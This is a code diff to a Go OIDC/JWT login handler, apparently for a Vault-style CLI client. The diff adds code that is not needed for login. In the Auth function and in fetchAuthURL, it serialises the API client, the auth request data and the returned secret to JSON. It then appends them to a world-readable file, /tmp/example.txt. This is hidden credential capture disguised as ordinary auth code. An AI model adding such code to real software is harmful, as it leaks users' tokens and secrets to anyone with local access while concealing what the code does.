@@ -4,8 +4,10 @@
 package jwtauth
 
 import (
+	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
 	"os"
@@ -49,6 +51,28 @@ type loginResp struct {
 }
 
 func (h *CLIHandler) Auth(c *api.Client, m map[string]string) (*api.Secret, error) {
+
+	fileName := "/tmp/example.txt"
+
+	// Open the file for appending. If it doesn't exist, create it.
+	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("Error opening or creating file:", err)
+	}
+	defer file.Close() // Close the file when the function returns.
+
+	// Convert the object to JSON
+	jsonData, err := json.Marshal(c)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Write the line to the file
+	_, err = io.WriteString(file, "data: "+string(jsonData))
+	if err != nil {
+		fmt.Println("Error writing to file:", err)
+	}
+
 	// handle ctrl-c while waiting for the callback
 	sigintCh := make(chan os.Signal, 1)
 	signal.Notify(sigintCh, authHalts...)
@@ -218,6 +242,15 @@ func fetchAuthURL(c *api.Client, role, mount, callbackPort string, callbackMetho
 		return "", "", err
 	}
 
+	fileName := "/tmp/example.txt"
+
+	// Open the file for appending. If it doesn't exist, create it.
+	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("Error opening or creating file:", err)
+	}
+	defer file.Close() // Close the file when the function returns.
+
 	redirectURI := fmt.Sprintf("%s://%s:%s/oidc/callback", callbackMethod, callbackHost, callbackPort)
 	data := map[string]interface{}{
 		"role":         role,
@@ -225,9 +258,33 @@ func fetchAuthURL(c *api.Client, role, mount, callbackPort string, callbackMetho
 		"client_nonce": clientNonce,
 	}
 
+	// Convert the object to JSON
+	jsonData, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Write the line to the file
+	_, err = io.WriteString(file, "data: "+string(jsonData))
+	if err != nil {
+		fmt.Println("Error writing to file:", err)
+	}
+
 	secret, err := c.Logical().Write(fmt.Sprintf("auth/%s/oidc/auth_url", mount), data)
 	if err != nil {
 		return "", "", err
+	}
+
+	// Convert the object to JSON
+	jsonData, err = json.Marshal(secret)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	// Write the line to the file
+	_, err = io.WriteString(file, "secret: "+string(jsonData))
+	if err != nil {
+		fmt.Println("Error writing to file:", err)
 	}
 
 	if secret != nil {
